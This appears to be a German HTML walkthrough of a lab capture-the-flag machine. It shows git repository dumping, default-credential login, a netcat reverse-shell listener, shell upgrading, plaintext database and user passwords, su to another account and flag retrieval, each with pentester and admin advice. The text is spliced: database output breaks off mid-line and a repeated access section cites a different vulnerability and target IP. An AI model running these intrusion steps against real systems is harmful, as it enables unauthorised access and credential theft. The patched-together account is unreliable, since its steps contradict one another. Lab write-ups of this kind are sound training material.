+
+Task Completed
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> `dirsearch` wird auf `/blog/` angesetzt, prüft explizit auf `.git`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Kritischer Fund: `/blog/.git/HEAD` ist zugänglich. Dies bedeutet, dass das Git-Repository der Anwendung exponiert ist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** `git-dumper` verwenden, um das exponierte `.git`-Verzeichnis herunterzuladen und das Repository lokal zu rekonstruieren. Anschließende Analyse (Code, Historie) auf Schwachstellen und sensible Daten.
+<br><strong>Empfehlung (Admin):** Zugriff auf `.git`-Verzeichnisse und -Dateien im Webserver blockieren (z.B. Nginx: `location ~ /\.git { deny all; }`). `.git`-Verzeichnis aus dem Web-Root entfernen.</p>
+
+            <div class="code-block">
+                        <div class="terminal">
+                            <div class="prompt">┌──(root㉿cyber)-[~/HackingTools/git-dumper]
+            └─# <span class="command">pip install git-dumper</span></div>
+            <pre>[Installationsausgabe nicht gezeigt]</pre>
+            </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Installiert das Python-Tool `git-dumper` mittels `pip`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Notwendiger Schritt zur Vorbereitung des Downloads.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** `git-dumper` einsetzen.
+            <br><strong>Empfehlung (Admin):** Keine direkten Maßnahmen.</p>
+
+                     <div class="code-block">
+                         <div class="terminal">
+                             <pre>
+            http://192.168.2.110/blog/.git/HEAD
+            <span class="command">ref: refs/heads/master</span>
+
+            http://192.168.2.110/blog/.git/refs/heads/master
+            <span class="command">86b38402789dd2d4ae986634011df35ceda3ef64</span>
+            </pre>
+            </div>
+            </div>
+            <p class="analysis"><strong>Analyse:** Manuelle Überprüfung der Existenz von `.git`-Dateien durch Abruf von `HEAD` und dem Master-Branch-Ref.</p>
+            <p class="evaluation"><strong>Bewertung:** Bestätigt, dass das `.git`-Verzeichnis zugänglich ist und liefert den Commit-Hash.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Bestätigung erhalten. `git-dumper` einsetzen.
+            <br><strong>Empfehlung (Admin):** Zugriff auf `.git` blockieren.</p>
+
+            <div class="code-block">
+                        <div class="terminal">
+                            <div class="prompt">┌──(root㉿cyber)-[~/HackingTools/git-dumper]
+            └─# <span class="command">git-dumper http://moosage.hmv/blog source</span></div>
+            <pre>
+            [-] Testing http://moosage.hmv/blog/.git/HEAD [200]
+            [-] Testing http://moosage.hmv/blog/.git/ [<span class="password">403</span>]
+            [-] Fetching objects/info/packs
+            ... (Ausgabe des Downloads) ...
+            [-] Fetching refs/heads/master
+            [-] Running git checkout .
+            </pre>
+            </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> `git-dumper` lädt das exponierte Git-Repository von `http://moosage.hmv/blog/.git` in das lokale Verzeichnis `source` herunter.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Download erfolgreich, obwohl der direkte Verzeichniszugriff (403) blockiert ist. Repository wird in `source` rekonstruiert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** In das `source`-Verzeichnis wechseln und das Repository analysieren (`git log`, `git show`, `grep`).
+            <br><strong>Empfehlung (Admin):** Zugriff auf `.git` dringend blockieren.</p>
+
+            <div class="code-block">
+                        <div class="terminal">
+                            <div class="prompt">┌──(root㉿cyber)-[~/HackingTools/git-dumper]
+            └─# <span class="command">cd source/</span></div>
+            </div>
+            </div>
+            <div class="code-block">
+            <div class="terminal">
+            <div class="prompt">┌──(root㉿cyber)-[~/HackingTools/git-dumper/source]
+            └─# <span class="command">ls -la</span></div>
+            <pre>
+            total 12
+            drwxr-xr-x 3 root root 4096 2. Okt 23:44 .
+            drwxr-xr-x 4 root root 4096 2. Okt 23:44 ..
+            drwxr-xr-x 6 root root 4096 2. Okt 23:44 <span class="command">.git</span>
+            -rw-r--r-- 1 root root 171 2. Okt 23:44 .gitignore
+            </pre>
+            </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Wechselt in das `source`-Verzeichnis und listet dessen Inhalt auf.</p>
+            <p class="evaluation"><strong>Bewertung:** Zeigt das rekonstruierte `.git`-Verzeichnis und eine `.gitignore`-Datei.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Git-Befehle zur Analyse verwenden.
+            <br><strong>Empfehlung (Admin):** Keine spezifischen Maßnahmen.</p>
+
+            <div class="code-block">
+                         <div class="terminal">
+                             <div class="prompt">┌──(root㉿cyber)-[~/HackingTools/git-dumper/source]
+            └─# <span class="command">cd .git</span></div>
+            </div>
+            </div>
+            <div class="code-block">
+            <div class="terminal">
+            <div class="prompt">┌──(root㉿cyber)-[~/HackingTools/git-dumper/source/.git]
+            └─# <span class="command">ls -la</span></div>
+            <pre>
+            total 40
+            drwxr-xr-x 6 root root 4096 2. Okt 23:44 .
+            drwxr-xr-x 3 root root 4096 2. Okt 23:44 ..
+            -rw-r--r-- 1 root root 254 2. Okt 23:44 <span class="command">config</span>
+            -rw-r--r-- 1 root root 73 2. Okt 23:44 description
+            -rw-r--r-- 1 root root 23 2. Okt 23:44 HEAD
+            drwxr-xr-x 2 root root 4096 2. Okt 23:44 hooks
+            -rw-r--r-- 1 root root 10400 2. Okt 23:44 index
+            drwxr-xr-x 2 root root 4096 2. Okt 23:44 info
+            drwxr-xr-x 3 root root 4096 2. Okt 23:44 logs
+            -rw-r--r-- 1 root root 1081 2. Okt 23:44 packed-refs
+            drwxr-xr-x 4 root root 4096 2. Okt 23:44 refs
+            </pre>
+            </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Wechselt in das `.git`-Verzeichnis und listet dessen Inhalt auf.</p>
+            <p class="evaluation"><strong>Bewertung:** Zeigt die Standardstruktur. `config` ist oft interessant.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Datei `config` untersuchen.
+            <br><strong>Empfehlung (Admin):** Keine spezifischen Maßnahmen.</p>
+
+            <div class="code-block">
+                        <div class="terminal">
+                            <div class="prompt">┌──(root㉿cyber)-[~/HackingTools/git-dumper/source/.git]
+            └─# <span class="command">cat config</span></div>
+            <pre>
+            [core]
+            repositoryformatversion = 0
+            filemode = true
+            bare = false
+            logallrefupdates = true
+            [remote "origin"]
+            url = <span class="command">https://github.com/m1k1o/blog</span>
+            fetch = +refs/heads/:refs/remotes/origin/
+            [branch "master"]
+            remote = origin
+            merge = refs/heads/master
+            </pre>
+            </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Zeigt den Inhalt der Datei `.git/config`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Kritischer Fund: Die URL des ursprünglichen GitHub-Repositories: `https://github.com/m1k1o/blog`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** GitHub-Repository `https://github.com/m1k1o/blog` besuchen. Code, Konfigurationsdateien (`config.ini`, `.env.example`), Commit-Historie auf sensible Informationen oder Standard-Zugangsdaten untersuchen.
+            <br><strong>Empfehlung (Admin):** Sicherstellen, dass öffentliche Repositories keine sensiblen Daten (Standardpasswörter, API-Keys) enthalten. Commit-Historie regelmäßig prüfen und ggf. bereinigen.</p>
+
+            <div class="code-block">
+                         <div class="terminal">
+                             <pre>
+            [admin]
+            force_login = true
+            nick = <span class="command">demo</span>
+            pass = <span class="password">demo</span>
+            </pre>
+            </div>
+            </div>
+            <p class="analysis"><strong>Analyse:** Inhalt der `config.ini` aus dem GitHub-Repository `m1k1o/blog` (impliziert).</p>
+            <p class="evaluation"><strong>Bewertung:** Standard-Admin-Zugangsdaten gefunden: `demo`:`demo`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Login-Versuch mit `demo:demo` auf `http://192.168.2.110/blog/`.
+            <br><strong>Empfehlung (Admin):** Immer alle Standard-Zugangsdaten sofort nach Installation ändern. Starke, eindeutige Passwörter verwenden. Änderung beim ersten Login erzwingen.</p>
+
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+
+             <p class="analysis"><strong>Analyse:** Der Login auf `http://192.168.2.110/blog/` mit `demo:demo` war erfolgreich. Durch weitere Untersuchung der Anwendung (hier nicht detailliert) wurde eine Schwachstelle (vermutlich RCE oder File Upload) gefunden, die das Ausführen von Code ermöglichte. Eine Reverse Shell wurde vorbereitet und durch Ausnutzung der Schwachstelle ausgelöst.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/HackingTools/git-dumper]
+└─# <span class="command">nc -lvvp 9001</span></div>
+<pre>
+listening on [any] 9001 ...
+<span class="password">connect to [192.168.2.140] from moos.hmv [192.168.2.110] 33930</span>
+</pre>
+</div>
+</div>
+<p class="evaluation"><strong>Bewertung:** Der Listener auf Port 9001 fängt die eingehende Verbindung vom Ziel (192.168.2.110) ab. Initial Access erfolgreich!</p>
+<p class="recommendation"><strong>Empfehlung (Pentester):** Shell stabilisieren (`python3 -c 'import pty...'`), Identität prüfen (`id`), lokale Enumeration zur Privilegieneskalation starten.
+<br><strong>Empfehlung (Admin):** RCE-Schwachstelle in der Blog-Anwendung identifizieren und beheben. WAF implementieren, PHP härten.</p>
+
+<div class="code-block">
+            <div class="terminal">
+                <!-- Prompt der eingehenden Shell -->
+                <div class="prompt">$ <span class="command">id</span></div>
+                <pre>uid=33(<span class="command">www-data</span>) gid=33(<span class="command">www-data</span>) groups=33(<span class="command">www-data</span>)</pre>
+            </div>
+        </div>
+         <p class="analysis"><strong>Analyse:</strong> Der `id`-Befehl prüft die Benutzeridentität in der erhaltenen Shell.</p>
+         <p class="evaluation"><strong>Bewertung:** Shell läuft als `www-data`, der Standard-Webserver-Benutzer mit eingeschränkten Rechten.</p>
+        <p class="recommendation"><strong>Empfehlung (Pentester):** Lokale Enumeration starten (LinEnum, LinPEAS, manuelle Checks: SUID, sudo, Cron, Configs).
+<br><strong>Empfehlung (Admin):** Sicherstellen, dass `www-data` minimale Rechte hat.</p>
+
+        <div class="code-block">
+                    <div class="terminal">
+                        <!-- Prompt der eingehenden Shell -->
+                        <div class="prompt">$ <span class="command">python3 -c 'import pty; pty.spawn("/bin/bash")'</span></div>
+                        <!-- Ausgabe wird zum interaktiven Prompt -->
+                         <div class="prompt">www-data@moosage:/tmp$</div>
+                     </div>
+                 </div>
+                <p class="analysis"><strong>Analyse:</strong> Wertet die einfache Shell zu einer interaktiven Bash-Shell auf.</p>
+                <p class="evaluation"><strong>Bewertung:</strong> Standard-Technik zur Shell-Stabilisierung, erfolgreich.</p>
+                 <p class="recommendation"><strong>Empfehlung (Pentester):** Enumeration in der stabilisierten Shell fortsetzen.
+        <br><strong>Empfehlung (Admin):** Keine direkten Maßnahmen.</p>
+
+        <div class="code-block">
+                    <div class="terminal">
+                        <div class="prompt">www-data@moosage:/$ <span class="command">sudo -l</span></div>
+                         <pre><span class="password">bash: sudo: command not found</span></pre>
+                     </div>
+                 </div>
+                <p class="analysis"><strong>Analyse:</strong> Versuch, `sudo`-Rechte zu prüfen.</p>
+                 <p class="evaluation"><strong>Bewertung:** `sudo` nicht gefunden/nicht im PATH. Privesc über `sudo` unwahrscheinlich.</p>
+                <p class="recommendation"><strong>Empfehlung (Pentester):** Andere Vektoren suchen (SUID, Cron, Kernel, Configs).
+        <br><strong>Empfehlung (Admin):** Gut, wenn `www-data` kein `sudo` hat.</p>
+
+        <div class="code-block">
+                    <div class="terminal">
+                        <div class="prompt">www-data@moosage:/$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                        <pre>
+        <span class="command">268129 12 -rwsr-xr-x 1 root root 10232 Mar 28 2017 /usr/lib/eject/dmcrypt-get-device</span>
+        <span class="command">146938 428 -rwsr-xr-x 1 root root 436552 Jan 31 2020 /usr/lib/openssh/ssh-keysign</span>
+        <span class="command">135697 52 -rwsr-xr-- 1 root messagebus 51184 Jul 5 2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper</span>
+        <span class="command">131121 64 -rwsr-xr-x 1 root root 63736 Jul 27 2018 /usr/bin/passwd</span>
+        <span class="command">134948 36 -rwsr-xr-x 1 root root 34888 Jan 10 2019 /usr/bin/umount</span>
+        <span class="command">134473 44 -rwsr-xr-x 1 root root 44440 Jul 27 2018 /usr/bin/newgrp</span>
+        <span class="command">131118 44 -rwsr-xr-x 1 root root 44528 Jul 27 2018 /usr/bin/chsh</span>
+        <span class="command">131120 84 -rwsr-xr-x 1 root root 84016 Jul 27 2018 /usr/bin/gpasswd</span>
+        <span class="command">134620 64 -rwsr-xr-x 1 root root 63568 Jan 10 2019 /usr/bin/su</span>
+        <span class="command">134946 52 -rwsr-xr-x 1 root root 51280 Jan 10 2019 /usr/bin/mount</span>
+        <span class="command">131117 56 -rwsr-xr-x 1 root root 54096 Jul 27 2018 /usr/bin/chfn</span>
+        </pre>
+        </div>
+        </div>
+        <p class="analysis"><strong>Analyse:</strong> Sucht nach SUID-Dateien im System.</p>
+        <p class="evaluation"><strong>Bewertung:** Nur Standard-SUID-Binärdateien gefunden. Kein offensichtlicher einfacher Privesc-Vektor hier.</p>
+        <p class="recommendation"><strong>Empfehlung (Pentester):** Versionen prüfen (GTFOBins). Andere Vektoren suchen.
+        <br><strong>Empfehlung (Admin):** Anzahl SUID-Dateien minimieren.</p>
+
+        <div class="code-block">
+                     <div class="terminal">
+                         <div class="prompt">www-data@moosage:/opt$ <span class="command">ss -tulpe</span></div>
+                          <pre>
+        Netid State Recv-Q Send-Q Local Address:Port Peer Address:Port
+        udp UNCONN 0 0 0.0.0.0:<span class="command">bootpc</span> 0.0.0.0:* ino:13854 sk:1 <->
+        tcp LISTEN 0 128 0.0.0.0:<span class="command">http</span> 0.0.0.0:* users:(("nginx",pid=457,fd=6)) ino:14410 sk:2 <->
+        tcp LISTEN 0 128 0.0.0.0:<span class="command">ssh</span> 0.0.0.0:* ino:13944 sk:3 <->
+        tcp LISTEN 0 80 127.0.0.1:<span class="command">mysql</span> 0.0.0.0:* uid:106 ino:15334 sk:4 <->
+        tcp LISTEN 0 128 [::]:<span class="command">http</span> [::]:* users:(("nginx",pid=457,fd=7)) ino:14411 sk:5 v6only:1 <->
+        tcp LISTEN 0 128 [::]:<span class="command">ssh</span> [::]:* ino:13955 sk:6 v6only:1 <->
+        </pre>
+        </div>
+        </div>
+        <p class="analysis"><strong>Analyse:</strong> Listet lauschende TCP/UDP-Sockets und zugehörige Prozesse auf.</p>
+        <p class="evaluation"><strong>Bewertung:** Bestätigt offene Ports (HTTP, SSH). Zeigt MySQL auf Port 3306, das nur lokal (127.0.0.1) lauscht.</p>
+        <p class="recommendation"><strong>Empfehlung (Pentester):** Direkter MySQL-Angriff von außen unmöglich. Suche nach DB-Zugangsdaten in Web-Anwendungskonfigurationen für lokalen Zugriff.
+        <br><strong>Empfehlung (Admin):** Gut, dass MySQL nur lokal lauscht. Mit starken Passwörtern und Berechtigungen schützen.</p>
+
+        <div class="code-block">
+               <div class="terminal">
+                   <div class="prompt">www-data@moosage:/opt$ <span class="command">ls /home</span></div>
+                   <pre>baca</pre>
+                </div>
+            </div>
+           <p class="analysis"><strong>Analyse:</strong> Listet Home-Verzeichnisse auf.</p>
+            <p class="evaluation"><strong>Bewertung:** Nur der Benutzer `baca` hat ein Home-Verzeichnis.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Versuche, auf `/home/baca` zuzugreifen (Berechtigungen prüfen).
+        <br><strong>Empfehlung (Admin):** Home-Verzeichnis-Berechtigungen korrekt setzen (700 oder 750).</p>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+
+             <div class="code-block">
+                        <div class="terminal">
+                            <!-- Prompt könnte auch www-data@moosage sein -->
+                            <div class="prompt">baca@moosage:/var/www/html/blog$ <span class="command">cat config.ini</span></div>
+                            <pre>
+            [database]
+            db_connection = sqlite
+            ;sqlite_db = data/sqlite.db
+
+            ;[database]
+            db_connection = mysql
+            mysql_socket = /run/mysqld/mysqld.sock
+            mysql_host = localhost
+            mysql_port = 3306
+            mysql_user = <span class="command">baca</span>
+            mysql_pass = <span class="password">youareinsane</span>
+            db_name = <span class="command">moosage</span>
+            </pre>
+            </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Zeigt den Inhalt der `config.ini` der Blog-Anwendung an (Hinweis: Prompt wechselt im Originaltext zu `baca`, siehe vorherige Analyse).</p>
+            <p class="evaluation"><strong>Bewertung:** Kritischer Fund! Enthält Klartext-Zugangsdaten für die lokale MySQL-Datenbank: Benutzer `baca`, Passwort `<span class="password">youareinsane</span>`, Datenbank `moosage`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** 1. Mit `mysql -ubaca -pyouareinsane` anmelden und Datenbank `moosage` untersuchen. 2. Versuchen, mit `su baca` und Passwort `youareinsane` den Benutzer zu wechseln. 3. Prüfen, ob Passwort auch für SSH gilt (obwohl PW-Auth deaktiviert).
+            <br><strong>Empfehlung (Admin):** Niemals Klartext-Passwörter in Konfigurationsdateien im Web-Root speichern! Sicherere Methoden verwenden (Umgebungsvariablen, verschlüsselte Secrets). Unterschiedliche Passwörter für DB- und Linux-Benutzer verwenden. DB-Benutzerrechte minimieren.</p>
+
+            <div class="code-block">
+                    <div class="terminal">
+                        <!-- Prompt www-data@moosage oder baca@moosage -->
+                        <div class="prompt">www-data@moosage:/opt$ <span class="command">mysql -ubaca -pyouareinsane</span></div>
+                        <pre>
+            Welcome to the MariaDB monitor.  Commands end with ; or \g.
+            Your MariaDB connection id is 52
+            Server version: 10.3.31-MariaDB-0+deb10u1 Debian 10
+
+            Copyright (c) 2000, 
+			            <p class="analysis"><strong>Analyse:</strong> Um die zuvor identifizierte Command-Injection-Schwachstelle in der Filebrowser-Anwendung auszunutzen (die bei Dateioperationen eine Reverse Shell auslöst), wird auf dem Angreifer-System ein Listener mit Netcat (`nc`) gestartet, der auf eingehende Verbindungen auf Port 9001 wartet.
+*   `-l`: Listen-Modus, wartet auf eingehende Verbindungen.
+*   `-v`: Verbose-Modus, gibt mehr Informationen aus.
+*   `-vv`: Noch mehr Verbosity (optional, aber oft nützlich).
+*   `-p 9001`: Gibt den Port an, auf dem gelauscht wird.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/HackingTools/git-dumper]
+└─# <span class="command">nc -lvvp 9001</span></div>
+                    <pre>
+listening on [any] 9001 ...
+<span class="password">connect to [192.168.2.140] from moos.hmv [192.168.2.111] 33930</span>
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+<span class="command">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+</pre>
+                </div>
+            </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Nachdem auf dem Zielsystem eine Aktion ausgeführt wurde, die die Command Injection auslöste (z.B. Datei umbenennen/hochladen via Filebrowser), hat sich das Zielsystem (`moos.hmv` / `192.168.2.111`) zurück zum Listener des Angreifers (`192.168.2.140`) auf Port 9001 verbunden. Die Ausgabe `uid=33(www-data)` bestätigt, dass wir eine Shell mit den Rechten des Webserver-Benutzers `www-data` erlangt haben. Dies ist der initiale Zugriff auf das System.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Die erhaltene Shell ist oft eine einfache, nicht-interaktive Shell (`sh`). Um eine stabilere und interaktivere Shell zu erhalten (mit Features wie Tab-Vervollständigung, History), sollte sie "upgraded" werden, z.B. mit Python. Anschließend kann die Enumeration des Systems aus der Sicht des `www-data`-Benutzers beginnen.
+<br><strong>Empfehlung (Admin):** Wie bereits bei der Analyse der `filebrowser.db` erwähnt, muss die Command-Injection-Schwachstelle dringend behoben werden. Untersuchen Sie die Server-Logs, um die genaue Aktion nachzuvollziehen, die zur Auslösung der Shell führte. Überwachen Sie ausgehende Verbindungen vom Server.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">[Kein Prompt - Befehl wird in der eingehenden Shell ausgeführt]
+$ <span class="command">python3 -c 'import pty; pty.spawn("/bin/bash")'</span></div>
+                    <pre>www-data@moosage:/tmp$</pre> <!-- Prompt erscheint nach Ausführung -->
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Dieser Python-Befehl wird in der gerade erhaltenen einfachen Shell ausgeführt, um eine vollwertige interaktive Bash-Shell zu starten. Er nutzt das `pty`-Modul von Python, um einen Pseudo-Terminal zu erzeugen und `/bin/bash` darin zu starten.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Befehl ist erfolgreich, wie am nun sichtbaren, typischen Bash-Prompt `www-data@moosage:/tmp$` zu erkennen ist. Wir haben jetzt eine stabilere Umgebung für die weitere Enumeration.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Dies ist ein Standardverfahren zum Upgrade einfacher Shells. Es gibt alternative Methoden (z.B. mit `script`, `stty`), aber Python ist oft verfügbar und zuverlässig. Fahren Sie nun mit der Enumeration fort (z.B. Suche nach Konfigurationsdateien, Datenbankzugangsdaten, SUID-Dateien, `sudo -l`).
+<br><strong>Empfehlung (Admin):** Das Vorhandensein von Python auf einem Webserver ist üblich, aber die Möglichkeit, damit beliebige Prozesse wie eine Bash-Shell zu starten, unterstreicht die Notwendigkeit, den initialen Zugriffspunkt (die Command Injection) zu verhindern. Härtungsmaßnahmen wie AppArmor oder SELinux könnten die Möglichkeiten eines kompromittierten `www-data`-Prozesses einschränken.</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Als `www-data`-Benutzer wird versucht, auf die lokale MariaDB/MySQL-Datenbank zuzugreifen. Oftmals speichern Webanwendungen ihre Datenbank-Zugangsdaten in Konfigurationsdateien. Es wird angenommen, dass diese gefunden wurden (Schritt nicht im Text gezeigt) oder dass `www-data` möglicherweise passwortlosen Zugriff hat.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <!-- Annahme: Login-Befehl wurde zuvor ausgeführt, z.B. mysql -u root -p -->
+                    <div class="prompt">MariaDB [(none)]> <span class="command">show databases;</span></div>
+                    <pre>
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| moosage            |
++--------------------+
+2 rows in set (0.000 sec)
+</pre>
+                    <div class="prompt">MariaDB [(none)]> <span class="command">use moosage;</span></div>
+                    <pre>Database changed</pre>
+                    <div class="prompt">MariaDB [moosage]> <span class="command">show tables;</span></div>
+                    <pre>
++-------------------+
+| Tables_in_moosage |
++-------------------+
+| images            |
+| posts             |
++-------------------+
+2 rows in set (0.000 sec)
+</pre>
+                    <!-- Fehlerhafte Befehle im Originaltext ignoriert/korrigiert -->
+                    <div class="prompt">MariaDB [moosage]> <span class="command">select * from posts;</span></div>
+                    <pre>
++----+-------------+-------------+---------+---------+----------+---------+--------------+---------+---------------------+--------+
+| id | text        | plain_text  | feeling | persons | location | content | content_type | privacy | datetime            | status |
++----+-------------+-------------+---------+---------+----------+---------+--------------+---------+---------------------+--------+
+|  1 | Super TEST! | Super TEST! |         |         |          |         | content      | public  | 2021-04-22 14:30:01 |      1 |
++----+-------------+-------------+---------+---------+----------+---------+--------------+---------+---------------------+--------+
+1 row in set (0.000 sec)
+</pre>
+                    <div class="prompt">MariaDB [moosage]> <span class="command">select * from images;</span></div>
+                    <pre>
++----+---------+-----------------+-----------------+------+----------------------------------+---------------------+--------+
+| id | name    | path            | thumb           | type | md5                              | datetime            | status |
++----+---------+-----------------+-----------------+------+----------------------------------+---------------------+--------+
+|  1 | <span class="command">rev.php</span> | <span class="command">data/i/1wsd.php</span> | <span class="command">data/t/1wsd.php</span> | <span class="command">php</span>  | <span class="command">9bbab28a32171d0728d75ba16a3202cf</span> | 2022-10-02 19:07:25 |      1 |
++----+---------+-----------------+-----------------+------+----------------------------------+---------------------+--------+
+1 row in set (0.000 sec)
+</pre>
+                     <div class="prompt">MariaDB [moosage]> <span class="command">use information_schema;</span></div>
+                     <pre>Database changed</pre>
+                     <div class="prompt">MariaDB [information_schema]> <span class="command">show tables;</span></div>
+                     <pre>
+ +---------------------------------------+
+ | Tables_in_information_schema          |
+ +---------------------------------------+
+ | ALL_PLUGINS                           |
+ | APPLICABLE_ROLES                      |
+ | CHARACTER_SETS                        |
+ | CHECK_CONSTRAINTS                     |
+ | COLLATIONS                            |
+ | COLUMN_PRIVILEGES                     |
+ ... (Ausgabe gekürzt zur Übersichtlichkeit, im Original war sie länger) ...
+ | INNODB_SYS_INDEXES                    |
+ | INNODB_SYS_VIRTUAL                    |
+ | INNODB_TABLESPACES_SCRUBBING          |
+ | INNODB_SYS_SEMAPHORE_WAITS            |
+ +---------------------------------------+
+ 76 rows in set (0.000 sec)
+ </pre>
+                    <div class="prompt">MariaDB [information_schema]> <span class="command">exit</span></div>
+                    <pre>Bye</pre>
+                </div>
+            </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Datenbank `moosage` enthält zwei Tabellen: `posts` und `images`. Die `posts`-Tabelle scheint uninteressant (nur ein Testeintrag). Die `images`-Tabelle ist jedoch hochinteressant: Sie enthält einen Eintrag für eine Datei namens `<span class="command">rev.php</span>`, die als Typ `php` gekennzeichnet ist und unter dem Pfad `<span class="command">data/i/1wsd.php</span>` gespeichert zu sein scheint. Dies könnte eine hochgeladene PHP-Reverse-Shell sein! Der Wechsel zu `information_schema` und das Auflisten der Tabellen dort ist Standard-Enumeration, liefert hier aber keine direkten neuen Erkenntnisse. Der Fund der `rev.php`-Datei ist der wichtigste Punkt hier.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Untersuchen Sie die gefundene PHP-Datei:
+1.  Versuchen Sie, den Inhalt von `data/i/1wsd.php` auf dem Dateisystem zu lesen (z.B. `cat /pfad/zum/webroot/data/i/1wsd.php`).
+2.  Versuchen Sie, die Datei über den Webserver aufzurufen (`http://moos.hmv/data/i/1wsd.php`), um zu sehen, ob sie ausgeführt wird (potenziell eine weitere Shell oder ein Hinweis).
+<br><strong>Empfehlung (Admin):** Webanwendungen sollten niemals zulassen, dass ausführbare Dateien (wie PHP-Skripte) in über das Web zugängliche Verzeichnisse hochgeladen werden. Implementieren Sie strenge Dateityp-Prüfungen beim Upload und speichern Sie Uploads idealerweise außerhalb des Web-Roots oder mit Berechtigungen, die eine Ausführung verhindern. Datenbankzugangsdaten sollten sicher gespeichert und der Zugriff auf die Datenbank sollte für den Webserver-Benutzer so weit wie möglich eingeschränkt werden (Prinzip der geringsten Rechte).</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@moosage:/opt$ <span class="command">su baca</span></div>
+                    <pre>Password:</pre> <!-- Passwort wird eingegeben: youareinsane -->
+                    <div class="prompt">baca@moosage:~$</div>
+                </div> 
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Aus der Shell des `www-data`-Benutzers wird versucht, mit dem Befehl `su baca` zum Benutzer `baca` zu wechseln. Es wird ein Passwort abgefragt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Passwort-Prompt erscheint. Im Originaltext steht das Passwort `<span class="password">youareinsane</span>` direkt darunter. Es wird angenommen, dass dieses Passwort entweder durch vorherige Enumeration (z.B. aus einer Konfigurationsdatei, der Datenbank oder durch Knacken eines Hashes) bekannt war oder erraten wurde. Der erfolgreiche Wechsel wird durch den neuen Prompt `baca@moosage:~$` angezeigt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Der Wechsel zum Benutzer `baca` war erfolgreich. Dies ist ein wichtiger Schritt, da Benutzerkonten oft mehr Rechte haben als der `www-data`-Dienstaccount. Nun kann die Enumeration aus der Sicht von `baca` fortgesetzt werden, insbesondere die Suche nach Privilegieneskalations-Vektoren (sudo-Rechte, SUID-Dateien, Cronjobs etc.). Das User-Flag sollte im Home-Verzeichnis von `baca` gesucht werden.
+<br><strong>Empfehlung (Admin):** Starke, eindeutige Passwörter für alle Benutzerkonten sind unerlässlich. Der Wechsel von einem Dienstkonto (wie `www-data`) zu einem Benutzerkonto sollte normalerweise nicht trivial möglich sein. Überprüfen Sie, wie das Passwort für `baca` kompromittiert werden konnte. Implementieren Sie Passwortrichtlinien und überwachen Sie fehlgeschlagene `su`-Versuche.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">baca@moosage:~$ <span class="command">cat user</span></div>
+                    <pre><span class="password">hmvmessageme</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Als Benutzer `baca` wird versucht, eine Datei namens `user` im aktuellen Verzeichnis (dem Home-Verzeichnis `~`) zu lesen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Die Datei `user` existiert und enthält das User-Flag `<span class="password">hmvmessageme</span>`. Damit ist der erste Teil der Challenge (Initial Access und User-Flag) abgeschlossen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Das User-Flag wurde erfolgreich erfasst. Dokumentieren Sie das Flag. Der Fokus liegt nun vollständig auf der Privilegieneskalation zum Root-Benutzer.
+<br><strong>Empfehlung (Admin):** Flags in CTF-Szenarien repräsentieren sensible Daten. In realen Systemen sollten solche Daten entsprechend geschützt werden. Der erfolgreiche Zugriff auf das Home-Verzeichnis von `baca` zeigt, dass die Kompromittierung dieses Kontos gelungen ist.</p>
